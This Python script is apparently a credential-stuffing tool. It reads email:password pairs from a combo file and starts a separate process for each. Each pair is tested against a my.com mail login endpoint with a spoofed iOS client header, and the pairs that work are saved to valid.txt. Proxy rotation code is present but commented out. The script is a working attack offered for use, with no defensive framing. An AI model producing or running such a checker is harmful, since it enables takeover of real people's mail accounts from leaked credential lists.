import requests
from bs4 import BeautifulSoup
import re
import os
from colorama import Fore, Style, init
init()
from platform import system
import threading
from multiprocessing import Process
import random
import sys
import time
opend = open('combo.txt', 'r').readlines()
proxy = []
class faqMailAccess:
    
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.load_prx()
        self.Checker()

    def load_prx(self):
        try:
            with open('proxies.txt', 'r+', encoding='utf-8') as x1:
                sx = x1.readlines()
                for x in sx:
                    try:
                        line = x.split()[0].replace('\n', '')
                        proxy.append(line)
                    except:
                        pass
        except:
            print("Please Create A File Named: 'proxies.com'")
            time.sleep(2)
            sys.exit()

    def Checker(self):
        sess = requests.Session()
        url = f"https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={self.email}&Password={self.password}"
        #proxys = random.choice(proxy)
        #proxy_for_check = {'http': f'http://{proxys}', 'https': f'https://{proxys}'}
        #sess.proxies = proxy_for_check
        url = "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={}&Password={}".format(self.email, self.password)
        headers = {
            "User-Agent": "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"
        }
        f = sess.get(url, headers=headers)
        #print(f.text)
        if f.text == "Ok=1":
            with open("valid.txt", "a+") as validf:
                print(f"{Fore.GREEN}{self.email}:{self.password}")
                validf.write(f"{self.email}:{self.password}\n")
        else:
            print(f"{Fore.RED}{self.email}:{self.password}")
            


        return

if __name__ == '__main__':
    

    with open("combo.txt", "r+", encoding='utf-8') as s:

        sx = s.readlines()
        processes = list()
        for x in sx:
            email, password = x.split(":")[0].replace('\n', ''), x.split(":")[1].replace('\n', '')
            process = Process(target=faqMailAccess, args=(email,password))
            process.start()
            processes.append(process)
        for process in processes:
               process.join()
